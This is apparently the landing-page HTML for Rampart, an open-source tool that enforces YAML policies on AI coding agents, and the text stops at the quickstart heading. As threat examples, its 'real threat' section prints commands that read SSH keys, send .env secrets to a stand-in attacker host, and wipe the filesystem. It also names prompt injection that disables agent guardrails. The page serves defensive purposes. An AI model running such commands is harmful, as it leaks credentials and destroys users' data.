@@ -1,0 +1,1156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Rampart — A Firewall for AI Coding Agents</title>
+  <meta name="description" content="Block dangerous commands before they run. Rampart enforces YAML policies against Claude Code, Codex, and Cline at the OS layer — 8µs overhead, no cloud, no account required." />
+  <link rel="canonical" href="https://rampart.sh/" />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://rampart.sh/" />
+  <meta property="og:title" content="Rampart — A Firewall for AI Coding Agents" />
+  <meta property="og:description" content="Your agent has root. Rampart blocks the dangerous stuff at the OS layer — without sandboxing away the work it actually needs to do." />
+  <meta property="og:image" content="https://rampart.sh/og.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:site" content="@rampart_sh" />
+  <meta name="twitter:title" content="Rampart — A Firewall for AI Coding Agents" />
+  <meta name="twitter:description" content="Your agent has root. Rampart blocks the dangerous stuff at the OS layer — without sandboxing away the work it actually needs to do." />
+  <meta name="twitter:image" content="https://rampart.sh/og.png" />
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "SoftwareApplication",
+    "name": "Rampart",
+    "description": "Open-source firewall for AI coding agents. Enforces YAML policies against every command, file access, and network request before it executes.",
+    "url": "https://rampart.sh",
+    "applicationCategory": "SecurityApplication",
+    "operatingSystem": "Linux, macOS",
+    "offers": {
+      "@type": "Offer",
+      "price": "0",
+      "priceCurrency": "USD"
+    },
+    "author": {
+      "@type": "Person",
+      "name": "Trevor",
+      "url": "https://github.com/peg"
+    },
+    "license": "https://www.apache.org/licenses/LICENSE-2.0",
+    "codeRepository": "https://github.com/peg/rampart"
+  }
+  </script>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:            #0a0a0b;
+      --bg-raised:     #111113;
+      --bg-overlay:    #18181c;
+      --border:        #232328;
+      --border-muted:  #1a1a1e;
+      --text:          #f0f0f2;
+      --text-muted:    #8888a0;
+      --text-dim:      #555568;
+      --amber:         #f5a623;
+      --amber-dim:     rgba(122,82,16,0.13);
+      --red:           #e53e3e;
+      --green:         #38a169;
+      --blue:          #4299e1;
+      --terminal-bg:   #0d0d0f;
+      --font-sans:     'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      --font-mono:     'JetBrains Mono', 'Fira Code', ui-monospace, monospace;
+      --ease-out:      cubic-bezier(0.16, 1, 0.3, 1);
+      --content-width: 1100px;
+      --section-gap:   clamp(4rem, 8vw, 8rem);
+    }
+
+    html { scroll-behavior: smooth; }
+    body {
+      font-family: var(--font-sans);
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    /* Layout */
+    .container { max-width: var(--content-width); margin: 0 auto; padding: 0 clamp(1rem, 4vw, 2rem); }
+    section { padding: var(--section-gap) 0; }
+    section + section { border-top: 1px solid var(--border-muted); }
+
+    /* Nav — solid background, no blur */
+    nav {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      background: rgba(10, 10, 11, 0.95);
+      border-bottom: 1px solid var(--border);
+      padding: 0.875rem 0;
+    }
+    .nav-inner { display: flex; align-items: center; justify-content: space-between; }
+    .nav-logo {
+      font-family: var(--font-mono);
+      font-size: 1rem;
+      font-weight: 500;
+      color: var(--text);
+      text-decoration: none;
+    }
+    .nav-links { display: flex; align-items: center; gap: 1.5rem; }
+    .nav-links a {
+      color: var(--text-muted);
+      text-decoration: none;
+      font-size: 0.875rem;
+      transition: color 150ms;
+    }
+    .nav-links a:hover { color: var(--text); }
+
+    /* Buttons */
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 0.625rem 1.25rem;
+      border-radius: 5px;
+      font-size: 0.875rem;
+      font-weight: 500;
+      text-decoration: none;
+      transition: all 150ms var(--ease-out);
+      cursor: pointer;
+      border: none;
+      font-family: var(--font-sans);
+    }
+    .btn-primary { background: var(--amber); color: #0a0a0b; }
+    .btn-primary:hover { background: #f9b840; transform: translateY(-1px); }
+    .btn-secondary { background: transparent; color: var(--text-muted); border: 1px solid var(--border); }
+    .btn-secondary:hover { color: var(--text); border-color: var(--text-dim); }
+    .btn-sm { padding: 0.4rem 0.875rem; font-size: 0.8rem; }
+
+    /* ═══════════════════════════════════════════
+       HERO
+    ═══════════════════════════════════════════ */
+    .hero {
+      position: relative;
+      padding: clamp(5rem, 12vw, 10rem) 0 3rem;
+      text-align: center;
+      overflow: hidden;
+    }
+    .hero::before {
+      content: '';
+      position: absolute;
+      top: 30%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 120%;
+      height: 60%;
+      background: radial-gradient(
+        ellipse at center,
+        rgba(245, 166, 35, 0.06) 0%,
+        rgba(245, 166, 35, 0.02) 40%,
+        transparent 70%
+      );
+      pointer-events: none;
+      z-index: 0;
+    }
+    .hero > .container { position: relative; z-index: 1; }
+
+    .hero-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 0.25rem 0.75rem;
+      border-radius: 999px;
+      border: 1px solid var(--border);
+      font-size: 0.8rem;
+      color: var(--text-muted);
+      font-family: var(--font-mono);
+      margin-bottom: 2rem;
+      animation: hero-fade-up 500ms var(--ease-out) both;
+      animation-delay: 0ms;
+    }
+    .hero-tag-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--amber);
+    }
+
+    h1 {
+      font-size: clamp(2.25rem, 5vw, 3.75rem);
+      font-weight: 700;
+      line-height: 1.15;
+      letter-spacing: -0.02em;
+      color: var(--text);
+      margin-bottom: 1.25rem;
+      max-width: 800px;
+      margin-left: auto;
+      margin-right: auto;
+      animation: hero-fade-up 500ms var(--ease-out) both;
+      animation-delay: 100ms;
+    }
+
+    .hero-sub {
+      font-size: clamp(1rem, 2vw, 1.2rem);
+      color: var(--text-muted);
+      max-width: 560px;
+      margin: 0 auto 2.5rem;
+      line-height: 1.6;
+      animation: hero-fade-up 500ms var(--ease-out) both;
+      animation-delay: 200ms;
+    }
+
+    .hero-actions {
+      display: flex;
+      gap: 0.75rem;
+      justify-content: center;
+      align-items: center;
+      flex-wrap: wrap;
+      animation: hero-fade-up 500ms var(--ease-out) both;
+      animation-delay: 300ms;
+    }
+
+    .hero-install-note {
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      color: var(--text-dim);
+      margin-top: 0.75rem;
+      animation: hero-fade-up 500ms var(--ease-out) both;
+      animation-delay: 400ms;
+    }
+
+    @keyframes hero-fade-up {
+      from { opacity: 0; transform: translateY(12px); }
+      to { opacity: 1; transform: none; }
+    }
+
+    /* Install terminal (inline hero) */
+    .install-terminal {
+      display: inline-block;
+      background: var(--terminal-bg);
+      border: 1px solid var(--border);
+      border-radius: 5px;
+      padding: 0.75rem 1rem;
+      font-family: var(--font-mono);
+      font-size: 0.875rem;
+      text-align: left;
+      min-width: 320px;
+      position: relative;
+    }
+    .install-terminal .t-dim { color: var(--text-dim); }
+    .install-terminal .t-cmd { color: var(--text); }
+
+    /* Copy button */
+    .copy-wrap { position: relative; display: inline-block; }
+    .copy-btn {
+      position: absolute;
+      top: 0.5rem;
+      right: 0.5rem;
+      background: var(--bg-overlay);
+      border: 1px solid var(--border);
+      color: var(--text-muted);
+      border-radius: 4px;
+      padding: 0.2rem 0.5rem;
+      font-size: 0.7rem;
+      cursor: pointer;
+      transition: all 150ms;
+      font-family: var(--font-mono);
+      opacity: 0;
+    }
+    .copy-wrap:hover .copy-btn { opacity: 1; }
+    .copy-btn:hover { color: var(--text); }
+    .copy-btn.copied { color: var(--green); border-color: var(--green); opacity: 1; }
+
+    /* ═══════════════════════════════════════════
+       POLICY EVALUATION LOG
+    ═══════════════════════════════════════════ */
+    .policy-log-section {
+      padding-top: 0;
+      padding-bottom: var(--section-gap);
+      border-top: none !important;
+    }
+
+    .policy-log {
+      background: var(--terminal-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      overflow: hidden;
+      font-family: var(--font-mono);
+      font-size: 0.82rem;
+      max-width: 720px;
+      margin: 0 auto;
+    }
+    .policy-log-bar {
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+      padding: 0.625rem 0.875rem;
+      border-bottom: 1px solid var(--border);
+      background: var(--bg-raised);
+    }
+    .policy-log-bar .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+    }
+    .dot-red { background: #ff5f57; }
+    .dot-yellow { background: #febc2e; }
+    .dot-green { background: #28c840; }
+    .log-title {
+      margin-left: 0.5rem;
+      font-size: 0.8rem;
+      color: var(--text-dim);
+      flex: 1;
+    }
+    .log-badge.live {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.3rem;
+      font-size: 0.7rem;
+      padding: 0.125rem 0.5rem;
+      border-radius: 999px;
+      font-weight: 600;
+      background: rgba(56, 161, 105, 0.15);
+      color: var(--green);
+      border: 1px solid rgba(56, 161, 105, 0.3);
+    }
+    .log-badge.live::before {
+      content: '●';
+      animation: live-pulse 2s ease-in-out infinite;
+    }
+    @keyframes live-pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.4; }
+    }
+    .policy-log-body {
+      padding: 0.875rem 1rem;
+      min-height: 280px;
+    }
+    .log-line {
+      display: grid;
+      grid-template-columns: 6.5rem 1.25rem 6rem 1fr;
+      gap: 0.75rem;
+      align-items: baseline;
+      padding: 0.18rem 0;
+      line-height: 1.6;
+    }
+    .log-line.entering {
+      animation: log-in 250ms var(--ease-out) both;
+    }
+    @keyframes log-in {
+      from { opacity: 0; transform: translateY(4px); }
+      to { opacity: 1; transform: none; }
+    }
+    .log-time { color: var(--text-dim); }
+    .log-verdict { font-size: 0.9rem; }
+    .log-op { color: var(--text-dim); }
+    .log-cmd {
+      color: var(--text-muted);
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+    .log-cmd.blocked { color: var(--red); }
+    .log-cmd.watch { color: var(--amber); }
+    .log-cmd.pending { color: var(--blue); }
+    .log-note {
+      color: var(--text-dim);
+      font-size: 0.78rem;
+      margin-left: 0.25rem;
+    }
+
+    /* ═══════════════════════════════════════════
+       SECTION TYPOGRAPHY
+    ═══════════════════════════════════════════ */
+    .section-label {
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      font-weight: 500;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: var(--amber);
+      margin-bottom: 1rem;
+    }
+    h2 {
+      font-size: clamp(1.5rem, 3vw, 2.25rem);
+      font-weight: 700;
+      line-height: 1.2;
+      letter-spacing: -0.015em;
+      margin-bottom: 0.75rem;
+    }
+    .section-sub {
+      font-size: 1.0625rem;
+      color: var(--text-muted);
+      max-width: 520px;
+      line-height: 1.6;
+    }
+
+    /* ═══════════════════════════════════════════
+       THE REAL THREAT
+    ═══════════════════════════════════════════ */
+    .threat-list { max-width: 600px; }
+    .threat-item {
+      padding: 0.875rem 0;
+      border-bottom: 1px solid var(--border-muted);
+    }
+    .threat-item:last-child { border-bottom: none; }
+    .threat-cmd {
+      display: block;
+      font-family: var(--font-mono);
+      font-size: 0.9rem;
+      color: var(--red);
+      margin-bottom: 0.25rem;
+    }
+    .threat-desc {
+      font-size: 0.875rem;
+      color: var(--text-muted);
+    }
+
+    /* ═══════════════════════════════════════════
+       FEATURE GRID — 5 CARDS, 3+2
+    ═══════════════════════════════════════════ */
+    .feature-grid {
+      display: grid;
+      grid-template-columns: repeat(6, 1fr);
+      gap: 1px;
+      background: var(--border);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    .feature-card {
+      background: var(--bg-raised);
+      padding: 1.5rem;
+      grid-column: span 2;
+      transition: background 200ms ease-out, transform 200ms ease-out;
+    }
+    .feature-card:nth-child(4) { grid-column: 2 / 4; }
+    .feature-card:nth-child(5) { grid-column: 4 / 6; }
+    .feature-card:hover {
+      background: #141416;
+      transform: translateY(-2px);
+      position: relative;
+      z-index: 1;
+    }
+    .feature-icon {
+      font-size: 1.75rem;
+      display: block;
+      margin-bottom: 0.75rem;
+      line-height: 1;
+    }
+    .feature-title {
+      font-size: 1rem;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 0.375rem;
+      line-height: 1.3;
+    }
+    .feature-desc {
+      font-size: 0.875rem;
+      color: var(--text-muted);
+      line-height: 1.55;
+    }
+
+    @media (max-width: 1024px) and (min-width: 641px) {
+      .feature-grid { grid-template-columns: repeat(2, 1fr); }
+      .feature-card { grid-column: auto !important; }
+      .feature-card:last-child { grid-column: 1 / -1 !important; }
+    }
+    @media (max-width: 640px) {
+      .feature-grid { grid-template-columns: 1fr; }
+      .feature-card { grid-column: auto !important; }
+    }
+
+    /* ═══════════════════════════════════════════
+       STATS ROW
+    ═══════════════════════════════════════════ */
+    .stats-row {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 1px;
+      background: var(--border);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      overflow: hidden;
+      max-width: 720px;
+      margin: 0 auto;
+    }
+    .stat {
+      background: var(--bg-raised);
+      padding: 1.5rem 1.25rem;
+      text-align: center;
+    }
+    .stat-num {
+      display: block;
+      font-family: var(--font-mono);
+      font-size: 2rem;
+      font-weight: 700;
+      color: var(--amber);
+      letter-spacing: -0.02em;
+      line-height: 1;
+      margin-bottom: 0.4rem;
+    }
+    .stat-label {
+      display: block;
+      font-size: 0.8rem;
+      color: var(--text-dim);
+      font-family: var(--font-mono);
+    }
+    @media (max-width: 640px) {
+      .stats-row { grid-template-columns: repeat(2, 1fr); }
+    }
+
+    /* ═══════════════════════════════════════════
+       AGENTS TABLE
+    ═══════════════════════════════════════════ */
+    .agents-table {
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      overflow: hidden;
+      font-size: 0.875rem;
+    }
+    .agents-row {
+      display: grid;
+      grid-template-columns: 8rem 1fr 9rem 5.5rem;
+      gap: 1rem;
+      align-items: center;
+      padding: 0.75rem 1rem;
+      border-bottom: 1px solid var(--border-muted);
+    }
+    .agents-row:last-child { border-bottom: none; }
+    .agents-row:hover { background: var(--bg-raised); }
+    .agents-row-header {
+      background: var(--bg-raised);
+      border-bottom: 1px solid var(--border) !important;
+      color: var(--text-dim);
+      font-size: 0.78rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      font-family: var(--font-mono);
+    }
+    .agents-row-header:hover { background: var(--bg-raised); }
+    .agent-name { font-weight: 600; color: var(--text); }
+    .agent-cmd { font-family: var(--font-mono); color: var(--text-muted); font-size: 0.82rem; }
+    .agent-mode { color: var(--text-dim); font-size: 0.82rem; }
+    .agent-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.3rem;
+      font-size: 0.75rem;
+      color: var(--green);
+      font-family: var(--font-mono);
+    }
+    @media (max-width: 640px) {
+      .agents-row { grid-template-columns: 7rem 1fr; }
+      .agent-mode, .agent-badge { display: none; }
+    }
+
+    /* ═══════════════════════════════════════════
+       POLICY YAML BLOCK
+    ═══════════════════════════════════════════ */
+    .policy-block {
+      background: var(--bg-raised);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 1.25rem 1.375rem;
+      font-family: var(--font-mono);
+      font-size: 0.84rem;
+      line-height: 1.75;
+      overflow-x: auto;
+      white-space: pre;
+      color: var(--text-muted);
+      max-width: 680px;
+      margin: 0 auto;
+    }
+    .yaml-key { color: #7ec8e3; }
+    .yaml-str { color: #a8d8a8; }
+    .yaml-hi {
+      background: rgba(245, 166, 35, 0.12);
+      color: var(--amber);
+      border-radius: 2px;
+      padding: 0 2px;
+    }
+    .yaml-comment { color: var(--text-dim); }
+
+    /* ═══════════════════════════════════════════
+       SOCIAL PROOF
+    ═══════════════════════════════════════════ */
+    .quote-block {
+      max-width: 680px;
+      margin: 0 auto;
+      text-align: center;
+    }
+    .quote-text {
+      font-size: clamp(1.125rem, 2vw, 1.375rem);
+      color: var(--text);
+      line-height: 1.5;
+      font-weight: 400;
+      font-style: italic;
+      margin-bottom: 1.25rem;
+    }
+    .quote-attr {
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      color: var(--text-dim);
+    }
+
+    /* ═══════════════════════════════════════════
+       TERMINAL (general)
+    ═══════════════════════════════════════════ */
+    .terminal {
+      background: var(--terminal-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      overflow: hidden;
+      font-family: var(--font-mono);
+      font-size: 0.875rem;
+    }
+    .terminal-bar {
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+      padding: 0.625rem 0.875rem;
+      border-bottom: 1px solid var(--border);
+      background: var(--bg-raised);
+    }
+    .terminal-bar .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+    }
+    .terminal-filename {
+      margin-left: 0.5rem;
+      font-size: 0.8rem;
+      color: var(--text-dim);
+    }
+    .terminal-body {
+      padding: 1rem 1.125rem;
+      overflow-x: auto;
+    }
+    .terminal-body code {
+      white-space: pre;
+      line-height: 1.7;
+    }
+    .t-prompt { color: var(--amber); }
+    .t-cmd { color: var(--text); }
+    .t-out { color: var(--text-muted); }
+    .t-dim { color: var(--text-dim); }
+    .t-success { color: var(--green); }
+
+    /* ═══════════════════════════════════════════
+       ECOSYSTEM
+    ═══════════════════════════════════════════ */
+    .ecosystem-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1px;
+      background: var(--border);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      overflow: hidden;
+      max-width: 680px;
+      margin: 0 auto;
+    }
+    .ecosystem-card {
+      background: var(--bg-raised);
+      padding: 1.5rem;
+    }
+    .ecosystem-name {
+      font-family: var(--font-mono);
+      font-weight: 600;
+      font-size: 1rem;
+      margin-bottom: 0.375rem;
+    }
+    .ecosystem-desc {
+      font-size: 0.875rem;
+      color: var(--text-muted);
+      line-height: 1.55;
+    }
+    @media (max-width: 640px) {
+      .ecosystem-grid { grid-template-columns: 1fr; }
+    }
+
+    /* ═══════════════════════════════════════════
+       FOOTER
+    ═══════════════════════════════════════════ */
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 2.5rem 0;
+    }
+    .footer-inner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 1rem;
+    }
+    .footer-left {
+      display: flex;
+      flex-direction: column;
+      gap: 0.375rem;
+    }
+    .footer-logo {
+      font-family: var(--font-mono);
+      font-size: 0.9rem;
+      color: var(--text-muted);
+      text-decoration: none;
+    }
+    .footer-note {
+      font-size: 0.75rem;
+      color: var(--text-dim);
+      font-family: var(--font-mono);
+    }
+    .footer-links { display: flex; gap: 1.5rem; flex-wrap: wrap; }
+    .footer-links a {
+      font-size: 0.875rem;
+      color: var(--text-dim);
+      text-decoration: none;
+      transition: color 150ms;
+    }
+    .footer-links a:hover { color: var(--text-muted); }
+
+    /* ═══════════════════════════════════════════
+       REVEAL ANIMATIONS
+    ═══════════════════════════════════════════ */
+    .reveal {
+      opacity: 0;
+      transform: translateY(16px);
+      transition: opacity 500ms var(--ease-out), transform 500ms var(--ease-out);
+    }
+    .reveal.visible {
+      opacity: 1;
+      transform: none;
+    }
+    .reveal-stagger > .reveal:nth-child(1) { transition-delay: 0ms; }
+    .reveal-stagger > .reveal:nth-child(2) { transition-delay: 60ms; }
+    .reveal-stagger > .reveal:nth-child(3) { transition-delay: 120ms; }
+    .reveal-stagger > .reveal:nth-child(4) { transition-delay: 180ms; }
+    .reveal-stagger > .reveal:nth-child(5) { transition-delay: 240ms; }
+
+    /* ═══════════════════════════════════════════
+       MOBILE OVERRIDES
+    ═══════════════════════════════════════════ */
+    @media (max-width: 640px) {
+      .hero-actions { flex-direction: column; align-items: center; }
+      .install-terminal { min-width: 0; width: 100%; }
+      .nav-links a:not(.btn) { display: none; }
+      .log-line { grid-template-columns: 1.25rem 5.5rem 1fr; }
+      .log-time { display: none; }
+    }
+
+    /* Inline code */
+    code:not([class]) {
+      font-family: var(--font-mono);
+      font-size: 0.85em;
+      background: var(--bg-raised);
+      padding: 0.15em 0.35em;
+      border-radius: 3px;
+      border: 1px solid var(--border-muted);
+    }
+
+    /* Cursor blink */
+    @keyframes cursor-blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+    .terminal-cursor {
+      display: inline-block;
+      width: 8px;
+      height: 1.1em;
+      background: var(--amber);
+      vertical-align: text-bottom;
+      animation: cursor-blink 1s step-end infinite;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ═══════════════════ NAV ═══════════════════ -->
+  <nav>
+    <div class="container nav-inner">
+      <a href="/" class="nav-logo">🏛 rampart</a>
+      <div class="nav-links">
+        <a href="#features">Features</a>
+        <a href="#quickstart">Quickstart</a>
+        <a href="https://github.com/peg/rampart" target="_blank" rel="noopener">GitHub</a>
+        <a href="#quickstart" class="btn btn-primary btn-sm">Get started →</a>
+      </div>
+    </div>
+  </nav>
+
+  <main>
+
+    <!-- ═══════════════════ HERO ═══════════════════ -->
+    <section class="hero">
+      <div class="container">
+        <div class="hero-tag"><span class="hero-tag-dot"></span> v0.9.5 — open source agent firewall</div>
+        <h1>Your agent has root.<br>That's the problem.</h1>
+        <p class="hero-sub">Every command, file access, and network request evaluated against your YAML policy before it executes. One Go binary, no cloud, no latency your agent can feel.</p>
+        <div class="hero-actions">
+          <div class="copy-wrap">
+            <div class="install-terminal">
+              <span class="t-dim">$</span> <span class="t-cmd" id="install-cmd">curl -fsSL https://rampart.sh/install | sh</span>
+            </div>
+            <button class="copy-btn" onclick="copyInstall(this)">copy</button>
+          </div>
+          <a href="https://github.com/peg/rampart" target="_blank" rel="noopener" class="btn btn-secondary">View on GitHub →</a>
+        </div>
+        <div class="hero-install-note">Installs to ~/.local/bin. No sudo required.</div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════ POLICY EVALUATION LOG ═══════════════════ -->
+    <section class="policy-log-section">
+      <div class="container">
+        <div class="policy-log">
+          <div class="policy-log-bar">
+            <span class="dot dot-red"></span>
+            <span class="dot dot-yellow"></span>
+            <span class="dot dot-green"></span>
+            <span class="log-title">rampart watch</span>
+            <span class="log-badge live">live</span>
+          </div>
+          <div class="policy-log-body" id="policy-log-stream">
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════ THE REAL THREAT ═══════════════════ -->
+    <section>
+      <div class="container">
+        <div class="section-label reveal">The problem</div>
+        <h2 class="reveal">The real threat isn't theoretical</h2>
+        <p class="section-sub reveal" style="margin-bottom: 2rem;">Claude Code runs with <code>--dangerously-skip-permissions</code>. Codex runs with <code>--full-auto</code>. Here's what that means.</p>
+        <div class="threat-list reveal">
+          <div class="threat-item">
+            <code class="threat-cmd">cat ~/.ssh/id_rsa</code>
+            <span class="threat-desc">Your private keys, exfiltrated in one read</span>
+          </div>
+          <div class="threat-item">
+            <code class="threat-cmd">cat .env | curl -X POST https://attacker.io</code>
+            <span class="threat-desc">Every secret in your environment, gone</span>
+          </div>
+          <div class="threat-item">
+            <code class="threat-cmd">rm -rf /</code>
+            <span class="threat-desc">Your filesystem. All of it.</span>
+          </div>
+        </div>
+        <p class="reveal" style="color: var(--text-dim); font-size: 0.875rem; margin-top: 1.5rem; max-width: 520px;">An injected prompt tells your agent to disable its own guardrails? Rampart runs at the OS layer. The agent can't edit its way out.</p>
+      </div>
+    </section>
+
+    <!-- ═══════════════════ FEATURES — A SEATBELT, NOT A CAGE ═══════════════════ -->
+    <section id="features">
+      <div class="container">
+        <div class="section-label reveal">Built-in protection</div>
+        <h2 class="reveal">A seatbelt, not a cage</h2>
+        <p class="section-sub reveal" style="margin-bottom: 2.5rem;">Five layers between your agent and disaster. Each one independent.</p>
+        <div class="feature-grid reveal-stagger">
+          <div class="feature-card reveal">
+            <span class="feature-icon">🛡️</span>
+            <div class="feature-title">Policy enforcement</div>
+            <div class="feature-desc">Every command, file access, and network request evaluated against your YAML policy before it executes. Pattern matching handles 95%+ of decisions instantly.</div>
+          </div>
+          <div class="feature-card reveal">
+            <span class="feature-icon">🔒</span>
+            <div class="feature-title">Response scanning</div>
+            <div class="feature-desc">If your agent reads a file containing credentials, the response is blocked before those secrets enter the agent's context window. Not just command blocking — output filtering.</div>
+          </div>
+          <div class="feature-card reveal">
+            <span class="feature-icon">👤</span>
+            <div class="feature-title">Approval gates</div>
+            <div class="feature-desc">Outbound HTTP, package installs, or anything you flag — the agent pauses and asks you before running it. You set the rules, or use ours.</div>
+          </div>
+          <div class="feature-card reveal">
+            <span class="feature-icon">📋</span>
+            <div class="feature-title">Tamper-evident audit</div>
+            <div class="feature-desc">Hash-chained JSONL audit log. See exactly what your agent does, then generate rules from the audit log. Policy modifications must be made by a human.</div>
+          </div>
+          <div class="feature-card reveal">
+            <span class="feature-icon">⚡</span>
+            <div class="feature-title">Eight microseconds</div>
+            <div class="feature-desc">One Go binary, no cloud, no latency your agent can feel. The firewall evaluates policies in 8µs. Your agent won't know it's there.</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════ NUMBERS ═══════════════════ -->
+    <section>
+      <div class="container">
+        <div class="stats-row reveal">
+          <div class="stat">
+            <span class="stat-num">8µs</span>
+            <span class="stat-label">policy eval</span>
+          </div>
+          <div class="stat">
+            <span class="stat-num">40+</span>
+            <span class="stat-label">built-in rules</span>
+          </div>
+          <div class="stat">
+            <span class="stat-num">95%</span>
+            <span class="stat-label">pattern match</span>
+          </div>
+          <div class="stat">
+            <span class="stat-num">0</span>
+            <span class="stat-label">cloud deps</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════ WORKS WITH YOUR AGENT ═══════════════════ -->
+    <section>
+      <div class="container">
+        <div class="section-label reveal">Compatibility</div>
+        <h2 class="reveal">Works with your agent</h2>
+        <p class="section-sub reveal" style="margin-bottom: 2rem;">Native hooks for the big four. Universal wrapper for everything else.</p>
+        <div class="agents-table reveal">
+          <div class="agents-row agents-row-header">
+            <span>Agent</span>
+            <span>Setup</span>
+            <span>Integration</span>
+            <span>Status</span>
+          </div>
+          <div class="agents-row">
+            <span class="agent-name">Claude Code</span>
+            <span class="agent-cmd">rampart setup claude-code</span>
+            <span class="agent-mode">hooks + bridge</span>
+            <span class="agent-badge">✅ native</span>
+          </div>
+          <div class="agents-row">
+            <span class="agent-name">Codex CLI</span>
+            <span class="agent-cmd">rampart setup codex</span>
+            <span class="agent-mode">hooks + bridge</span>
+            <span class="agent-badge">✅ native</span>
+          </div>
+          <div class="agents-row">
+            <span class="agent-name">Cline</span>
+            <span class="agent-cmd">rampart setup cline</span>
+            <span class="agent-mode">LD_PRELOAD</span>
+            <span class="agent-badge">✅ native</span>
+          </div>
+          <div class="agents-row">
+            <span class="agent-name">OpenClaw</span>
+            <span class="agent-cmd">rampart setup openclaw</span>
+            <span class="agent-mode">shim + bridge</span>
+            <span class="agent-badge">✅ native</span>
+          </div>
+          <div class="agents-row">
+            <span class="agent-name">Any agent</span>
+            <span class="agent-cmd">rampart wrap -- &lt;cmd&gt;</span>
+            <span class="agent-mode">shim</span>
+            <span class="agent-badge">✅ universal</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════ IT'S JUST YAML ═══════════════════ -->
+    <section>
+      <div class="container" style="text-align: center;">
+        <div class="section-label reveal">Policy format</div>
+        <h2 class="reveal">It's just YAML</h2>
+        <p class="section-sub reveal" style="margin: 0 auto 2rem; text-align: center;">40+ built-in rules, or write your own. No SDK, no DSL, no proprietary config language.</p>
+        <pre class="policy-block reveal"><code><span class="yaml-key">version</span>: <span class="yaml-str">"1"</span>
+<span class="yaml-key">policies</span>:
+  - <span class="yaml-key">name</span>: <span class="yaml-str">block-credential-leak</span>
+    <span class="yaml-key">match</span>:
+      <span class="yaml-key">tool</span>: <span class="yaml-str">file.read</span>
+    <span class="yaml-key">rules</span>:
+      - <span class="yaml-key">when</span>:
+          <span class="yaml-key">path_matches</span>: [<span class="yaml-str">"**/.env"</span>, <span class="yaml-str">"**/.ssh/*"</span>, <span class="yaml-str">"**/id_rsa"</span>]
+        <span class="yaml-hi">action: deny</span>
+        <span class="yaml-key">message</span>: <span class="yaml-str">"Credential access blocked"</span>
+
+  - <span class="yaml-key">name</span>: <span class="yaml-str">require-approval-outbound</span>
+    <span class="yaml-key">match</span>:
+      <span class="yaml-key">tool</span>: <span class="yaml-str">http</span>
+    <span class="yaml-key">rules</span>:
+      - <span class="yaml-key">when</span>:
+          <span class="yaml-key">url_not_in_allowlist</span>: <span class="yaml-str">true</span>
+        <span class="yaml-key">action</span>: <span class="yaml-str">require-approval</span></code></pre>
+      </div>
+    </section>
+
+    <!-- ═══════════════════ SOCIAL PROOF ═══════════════════ -->
+    <section>
+      <div class="container">
+        <div class="quote-block reveal">
+          <p class="quote-text">"I built Rampart after my own agent nearly nuked a directory on my homelab."</p>
+          <p class="quote-attr">— Trevor, creator of Rampart · Hacker News</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════ QUICKSTART ═══════════════════ -->
+    <section id="quickstart">
+      <div class="container" style="text-align: center;">
+        <div class="section-label reveal">Get started</div>
+        <h2 class="reveal">Start in two minutes</h2>
